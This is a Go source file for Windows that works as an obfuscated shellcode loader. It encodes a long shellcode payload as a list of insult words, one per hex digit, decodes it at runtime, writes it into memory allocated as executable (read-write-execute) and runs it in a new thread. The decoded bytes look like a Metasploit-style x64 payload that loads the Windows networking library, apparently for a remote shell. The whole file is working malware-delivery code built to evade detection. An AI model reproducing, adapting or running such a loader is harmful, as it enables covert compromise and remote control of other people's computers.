package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

// Hex to insult mapping (reverse lookup)
var insultsToHex = map[string]byte{
	"Nitwit":    '0',
	"Buffoon":   '1',
	"Nincompoop": '2',
	"Dunce":     '3',
	"Cretin":    '4',
	"Oaf":       '5',
	"Dimwit":    '6',
	"Blockhead": '7',
	"Dolt":      '8',
	"Lummox":    '9',
	"Simpleton": 'A',
	"Clod":      'B',
	"Moron":     'C',
	"Fool":      'D',
	"Imbecile":  'E',
	"Sluggard":  'F',
}

// Decode insults back to shellcode
func insultsToShellcode(insultCode []string) []byte {
	var shellcode []byte
	for i := 0; i < len(insultCode); i += 2 {
		if i+1 >= len(insultCode) {
			fmt.Println("Error: Odd number of insults. Cannot decode.")
			return nil
		}
		highNibble, exists1 := insultsToHex[insultCode[i]]
		lowNibble, exists2 := insultsToHex[insultCode[i+1]]

		if !exists1 || !exists2 {
			fmt.Printf("Error: Unknown insult encountered: %s or %s\n", insultCode[i], insultCode[i+1])
			return nil
		}
		byteValue := (hexToByte(highNibble) << 4) | hexToByte(lowNibble)
		shellcode = append(shellcode, byteValue)
	}
	return shellcode
}

func hexToByte(hexChar byte) byte {
	switch {
	case '0' <= hexChar && hexChar <= '9':
		return hexChar - '0'
	case 'A' <= hexChar && hexChar <= 'F':
		return hexChar - 'A' + 10
	}
	return 0
}

func main() {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	//our shellcode encoded via insults.go
	insultCode := []string{"Sluggard","Moron","Cretin","Dolt","Dolt","Buffoon","Imbecile","Cretin","Sluggard","Nitwit","Sluggard","Sluggard","Sluggard","Sluggard","Sluggard","Sluggard","Imbecile","Dolt","Fool","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Cretin","Buffoon","Oaf","Buffoon","Cretin","Buffoon","Oaf","Nitwit","Oaf","Nincompoop","Oaf","Buffoon","Oaf","Dimwit","Cretin","Dolt","Dunce","Buffoon","Fool","Nincompoop","Dimwit","Oaf","Cretin","Dolt","Dolt","Clod","Oaf","Nincompoop","Dimwit","Nitwit","Dunce","Imbecile","Cretin","Dolt","Dolt","Clod","Oaf","Nincompoop","Buffoon","Dolt","Dunce","Imbecile","Cretin","Dolt","Dolt","Clod","Oaf","Nincompoop","Nincompoop","Nitwit","Dunce","Imbecile","Cretin","Dolt","Dolt","Clod","Blockhead","Nincompoop","Oaf","Nitwit","Dunce","Imbecile","Cretin","Dolt","Nitwit","Sluggard","Clod","Blockhead","Cretin","Simpleton","Cretin","Simpleton","Cretin","Fool","Dunce","Buffoon","Moron","Lummox","Cretin","Dolt","Dunce","Buffoon","Moron","Nitwit","Simpleton","Moron","Dunce","Moron","Dimwit","Buffoon","Blockhead","Moron","Nitwit","Nincompoop","Nincompoop","Moron","Nincompoop","Nitwit","Cretin","Buffoon","Moron","Buffoon","Moron","Lummox","Nitwit","Fool","Cretin","Buffoon","Nitwit","Buffoon","Moron","Buffoon","Imbecile","Nincompoop","Imbecile","Fool","Oaf","Nincompoop","Cretin","Buffoon","Oaf","Buffoon","Dunce","Imbecile","Cretin","Dolt","Dolt","Clod","Oaf","Nincompoop","Nincompoop","Nitwit","Dunce","Imbecile","Dolt","Clod","Cretin","Nincompoop","Dunce","Moron","Cretin","Dolt","Nitwit","Buffoon","Fool","Nitwit","Dunce","Imbecile","Dolt","Clod","Dolt","Nitwit","Dolt","Dolt","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Cretin","Dolt","Dolt","Oaf","Moron","Nitwit","Blockhead","Cretin","Dimwit","Sluggard","Cretin","Dolt","Nitwit","Buffoon","Fool","Nitwit","Oaf","Nitwit","Dunce","Imbecile","Dolt","Clod","Cretin","Dolt","Buffoon","Dolt","Dunce","Imbecile","Cretin","Cretin","Dolt","Clod","Cretin","Nitwit","Nincompoop","Nitwit","Cretin","Lummox","Nitwit","Buffoon","Fool","Nitwit","Imbecile","Dunce","Oaf","Moron","Cretin","Dolt","Sluggard","Sluggard","Moron","Lummox","Dunce","Imbecile","Cretin","Buffoon","Dolt","Clod","Dunce","Cretin","Dolt","Dolt","Cretin","Dolt","Nitwit","Buffoon","Fool","Dimwit","Cretin","Fool","Dunce","Buffoon","Moron","Lummox","Cretin","Dolt","Dunce","Buffoon","Moron","Nitwit","Simpleton","Moron","Cretin","Buffoon","Moron","Buffoon","Moron","Lummox","Nitwit","Fool","Cretin","Buffoon","Nitwit","Buffoon","Moron","Buffoon","Dunce","Dolt","Imbecile","Nitwit","Blockhead","Oaf","Sluggard","Buffoon","Dunce","Imbecile","Cretin","Moron","Nitwit","Dunce","Cretin","Moron","Nincompoop","Cretin","Nitwit","Dolt","Cretin","Oaf","Dunce","Lummox","Fool","Buffoon","Blockhead","Oaf","Fool","Dimwit","Oaf","Dolt","Dunce","Imbecile","Cretin","Cretin","Dolt","Clod","Cretin","Nitwit","Nincompoop","Cretin","Cretin","Lummox","Nitwit","Buffoon","Fool","Nitwit","Dimwit","Dimwit","Dunce","Imbecile","Cretin","Buffoon","Dolt","Clod","Nitwit","Moron","Cretin","Dolt","Dunce","Imbecile","Cretin","Cretin","Dolt","Clod","Cretin","Nitwit","Buffoon","Moron","Cretin","Lummox","Nitwit","Buffoon","Fool","Nitwit","Dunce","Imbecile","Cretin","Buffoon","Dolt","Clod","Nitwit","Cretin","Dolt","Dolt","Cretin","Dolt","Nitwit","Buffoon","Fool","Nitwit","Cretin","Buffoon","Oaf","Dolt","Cretin","Buffoon","Oaf","Dolt","Oaf","Imbecile","Oaf","Lummox","Oaf","Simpleton","Cretin","Buffoon","Oaf","Dolt","Cretin","Buffoon","Oaf","Lummox","Cretin","Buffoon","Oaf","Simpleton","Cretin","Dolt","Dolt","Dunce","Imbecile","Moron","Nincompoop","Nitwit","Cretin","Buffoon","Oaf","Nincompoop","Sluggard","Sluggard","Imbecile","Nitwit","Oaf","Dolt","Cretin","Buffoon","Oaf","Lummox","Oaf","Simpleton","Dunce","Imbecile","Cretin","Dolt","Dolt","Clod","Buffoon","Nincompoop","Imbecile","Lummox","Cretin","Lummox","Sluggard","Sluggard","Sluggard","Sluggard","Sluggard","Sluggard","Oaf","Fool","Dunce","Imbecile","Cretin","Dolt","Dolt","Fool","Dolt","Fool","Nincompoop","Blockhead","Nitwit","Buffoon","Nitwit","Nitwit","Nitwit","Nitwit","Cretin","Buffoon","Clod","Simpleton","Cretin","Moron","Blockhead","Blockhead","Nincompoop","Dimwit","Nitwit","Blockhead","Sluggard","Sluggard","Fool","Oaf","Cretin","Lummox","Moron","Blockhead","Moron","Buffoon","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Dunce","Imbecile","Cretin","Dolt","Dolt","Fool","Lummox","Oaf","Nitwit","Imbecile","Nitwit","Buffoon","Nitwit","Nitwit","Nitwit","Nitwit","Dunce","Imbecile","Cretin","Moron","Dolt","Fool","Dolt","Oaf","Buffoon","Moron","Nitwit","Buffoon","Nitwit","Nitwit","Nitwit","Nitwit","Cretin","Dolt","Dunce","Buffoon","Moron","Lummox","Cretin","Buffoon","Clod","Simpleton","Cretin","Oaf","Dolt","Dunce","Oaf","Dimwit","Nitwit","Blockhead","Sluggard","Sluggard","Fool","Oaf","Cretin","Dolt","Dunce","Buffoon","Moron","Lummox","Cretin","Buffoon","Clod","Simpleton","Sluggard","Nitwit","Clod","Oaf","Simpleton","Nincompoop","Oaf","Dimwit","Sluggard","Sluggard","Fool","Oaf","Blockhead","Dunce","Dimwit","Dolt","Dimwit","Oaf","Dimwit","Moron","Dimwit","Moron","Dimwit","Dunce","Dimwit","Sluggard","Dimwit","Cretin","Dimwit","Oaf","Nincompoop","Nitwit","Blockhead","Nincompoop","Blockhead","Oaf","Dimwit","Imbecile","Nitwit","Nitwit","Cretin","Fool","Dimwit","Oaf","Blockhead","Dunce","Blockhead","Dunce","Dimwit","Buffoon","Dimwit","Blockhead","Dimwit","Oaf","Cretin","Nincompoop","Dimwit","Sluggard","Blockhead","Dolt","Nitwit","Nitwit","Blockhead","Oaf","Blockhead","Dunce","Dimwit","Oaf","Blockhead","Nincompoop","Dunce","Dunce","Dunce","Nincompoop","Nincompoop","Imbecile","Dimwit","Cretin","Dimwit","Moron","Dimwit","Moron","Nitwit","Nitwit","Nitwit","Nitwit","Dimwit","Dolt","Cretin","Buffoon","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Sluggard","Sluggard","Sluggard","Sluggard","Sluggard","Sluggard","Sluggard","Sluggard","Dolt","Nitwit","Cretin","Buffoon","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Dunce","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Dolt","Imbecile","Cretin","Buffoon","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Lummox","Imbecile","Cretin","Buffoon","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Cretin","Clod","Cretin","Oaf","Oaf","Nincompoop","Cretin","Imbecile","Cretin","Oaf","Cretin","Moron","Dunce","Dunce","Dunce","Nincompoop","Nincompoop","Imbecile","Dimwit","Cretin","Dimwit","Moron","Dimwit","Moron","Nitwit","Nitwit","Nitwit","Nitwit","Oaf","Dolt","Nitwit","Cretin","Oaf","Dimwit","Dimwit","Lummox","Blockhead","Nincompoop","Blockhead","Cretin","Blockhead","Oaf","Dimwit","Buffoon","Dimwit","Moron","Cretin","Buffoon","Dimwit","Moron","Dimwit","Moron","Dimwit","Sluggard","Dimwit","Dunce","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Oaf","Nitwit","Buffoon","Cretin","Oaf","Blockhead","Dolt","Dimwit","Lummox","Blockhead","Cretin","Oaf","Nitwit","Blockhead","Nincompoop","Dimwit","Sluggard","Dimwit","Dunce","Dimwit","Oaf","Blockhead","Dunce","Blockhead","Dunce","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Dolt","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit","Nitwit"}
	// Decode words back to shellcode
	shellcode := insultsToShellcode(insultCode)
	// Allocate memory
	addr, _, err := virtualAlloc.Call(
		0, 
		uintptr(len(shellcode)), 
		windows.MEM_COMMIT|windows.MEM_RESERVE, 
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		fmt.Printf("VirtualAlloc failed: %v\n", err)
		return
	}
	fmt.Printf("Memory allocated at: %v\n", addr)

	// Copy the shellcode into memory
	_, _, err = rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != syscall.Errno(0) {
		fmt.Printf("RtlMoveMemory failed: %v\n", err)
		return
	}

	threadHandle, _, err := createThread.Call(
		0, 0, addr, 0, 0, 0, 
	)
	if threadHandle == 0 {
		fmt.Printf("CreateThread failed: %v\n", err)
		return
	}
	ret, _, err := waitForSingleObject.Call(threadHandle, 0xFFFFFFFF)
	if ret == 0xFFFFFFFF {
		return
	}

	fmt.Println("Shellcode executed and thread completed successfully.")
}
